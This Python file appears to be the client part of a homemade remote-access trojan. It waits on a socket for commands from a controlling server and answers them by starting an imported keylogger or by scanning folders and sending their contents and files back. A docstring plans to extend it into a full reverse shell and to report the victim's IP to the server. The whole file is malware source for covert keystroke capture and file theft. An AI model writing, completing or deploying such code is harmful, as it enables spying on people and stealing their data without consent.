import socket
import userscanner
import keylogger
# TODO finish a client command structure
""" 
    This will await commands from the server something like a reverse shell
    When the server sends a show file request this will call the userscanner function
    We can extend this to full on reverse shell in the future

    ALSO:
        OPTIONAL: make a socket that sends the clients ip so the server will know hwo to connect
"""
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
            print("0")
            main_s.bind(("127.0.0.1", 12345))
            print("1")
            main_s.listen(1)
            print("2")
            conn, addr = main_s.accept()
            print("3")
            with conn:
                while True:
                    data = conn.recv(64).decode("utf-8") 
                    # The command section:
                    match data:
                        case "run -keylogger":
                            keylogger.start_keylogger()
                            print("Client Started the keylogger.")
                            data = " "
                        # To je kokotské implementovanie, ale nemusím 500 if dávať
                        case data if "run -getFolderContents" in data:
                            userscanner.sendFolderData(data)
                            userscanner.sendFiles(data)
                            print("Client Started the FileTransfer.")
                            data = " "

       
